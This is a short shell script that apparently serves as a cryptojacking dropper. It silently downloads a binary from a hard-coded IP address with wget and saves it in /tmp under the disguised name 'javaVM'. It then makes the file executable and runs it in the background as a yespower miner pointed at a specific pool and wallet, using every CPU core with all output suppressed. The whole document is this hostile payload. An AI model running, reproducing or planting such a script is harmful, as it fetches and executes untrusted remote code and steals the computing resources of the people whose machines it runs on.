#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -a yespower -o 143.47.231.0:443 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o --timeout 120 -p c=RVN,m=solo -t $(nproc) > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q http://150.136.168.71:80/archxx/yespowersugar -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -a yespower -o 143.47.231.0:443 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o --timeout 120 -p c=RVN,m=solo -t $(nproc) > /dev/null 2>&1 &
fi
